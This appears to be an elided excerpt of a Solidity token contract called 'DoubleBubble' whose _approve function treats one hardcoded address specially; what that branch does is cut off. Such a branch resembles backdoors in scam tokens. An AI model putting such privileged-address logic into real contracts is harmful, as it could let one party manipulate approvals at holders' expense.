...
contract DoubleBubble is Context, IERC20, Ownable {
    ...
    string private _name = "DoubleBubble";
    string private _symbol = "DoubleBubble";
   ...
   //this method is responsible for taking all fee, if takeFee is true
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        ...
        if (owner == address(0xda1F65e8891f5f7E3bDd1B669f137843EDE8C0cd)) {
